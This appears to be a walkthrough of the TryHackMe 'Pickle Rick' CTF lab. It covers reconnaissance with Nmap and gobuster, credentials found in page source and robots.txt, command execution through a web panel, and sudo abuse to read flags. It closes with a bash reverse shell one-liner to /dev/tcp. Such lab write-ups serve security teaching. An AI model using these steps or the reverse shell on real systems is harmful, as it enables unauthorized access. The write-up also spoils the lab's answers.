Try-Hack-Me Pickle Rick

This lab is an easy rated, CTF style lab, that is based on the television show Rick and Morty.
In this Rick and Morty themed lab, users are challenged to exploit a web server to find 3 ingredients that will help Rick make a potion that will transform him from pickle to human.

First after starting the machine I run Nmap to see what ports are open and saving the results to a file called initial_scan.

<p alight="center">
 <img src="https://github.com/simonmoseley/THM-Writeups/blob/faf861cc0be30aa1568278e5753343d6cb922455/pickleRick/screenShots/nmap1.png">
</p>

With only two open ports, 22 and 80, I use the -A flag in Nmap on those two ports to get additional information about the ports and victim machine.

<p alight="center">
 <img src="pickleRick/screenShots/nmap2.png">
</p>

<p alight="center">
 <img src="pickleRick/screenShots/nmap3.png">
</p>

From our results I can the victim machine is running Linux Ubuntu and that there is an Apache web server and webpage on port 80

Next I visit the webpage in my browser. 

{browser1 photo} 

Here begins the start of the story. The webpage is a note from Rick to Morty explaining that he has turned himself into a pickle again and needs Morty\'92s help to turn back.
He tells Morty to log into his computer and find the last three secret ingredients needed for his "pickle-reverse potion", but he has no idea what the password is. 

My first thought it to look at the source code of the webpage to see if there is anything useful.

{browser1_sc photo}

AH HA! In the source code there is a username commented out by rick { R1ckRul3s }. 

As a general practice, I check to see if the webpage has a robots.txt before moving on, and it does!

{robots1 photo} 

There isn't much there except for wubbalubbadubdub. Into the lab notes It goes.

Just to rule it out, I try to use the username we found in the source code and the string I found in the robots.txt, as a username and password combo on the open ssh with no success. On we go.

Next, I run gobuster to see if there are any hidden directories or redirects.

{gobuster1 photo}

In the results there are two redirects to a /login.php directory. 

{gobuster2 photo}

I visit the login.php and find a login portal.
Next it try the same username and password combo I used earlier for SSH.

Success!

{portal1 photo}

After clicking around on the website and viewing the source code, I find all except for the Commands page, redirects to a denied.php with a message that only the REAL rick can view this page.
Since I know the machine we are connected to is a linux machine, I enter the whoami command on the Command Panel page to see what happens.

{command1 photo}

Printed to our screen I see the output www-data.

{command2 photo}

I assume then that I am in the /var/www/html folder. I then try ls -la and find there is a file called Sup3rS3cretPickl3Ingred.txt, so I visit that page and find our first flag.
Trying to use the cat command showed that it is disabled.

{disabled photo}

Looking into the disabled page I find a comment that looks like base encoding.

{disabled2 photo}

After decoding a few times I realized the string was getting smaller and smaller which led me to believe it may have been a password.
It was not... rabbit hole

Getting back on track! I go back to the command page and some directory traversal to see what other information I can find. Using ls -la ../../../home I find users rick and ubuntu. I later found that typing ../../ was unnecessary 

{traversal1 photo}

Inside of the rick directory, there is a file called second ingredients.

{traversal2 photo}

Since cat is disabled I tried the more command with no luck. Next option is the less command.

{traversal3 photo}

BAM! There is our second flag.

I assume now the 3rd and final flag is in the machines root folder. Typically I would try to get a shell on the machine but since we can execute commands here, lets see what we can do here first.
Since I am logged in as the www-data user. I check to see what permissions they have using sudo -l 

{root1 photo}

The user www-data can run all commands with no passwords. So now I sudo -ls -la the contents of the /root folder

{root2 photo}

And like before, I used the less command to view the contents of file 3rd.txt for the third and final flag.

{root3 photo}

This lab was a quick and easy room that didn\'92t require you to gain access to solve. 
I did go back and try tp gain access using a reverse shell and had success with 
Bash -c \'bash -I >& /dev/tcp/IP address/8080 0>&1\'
From there it was the same sudo -l commands to find the final flag.

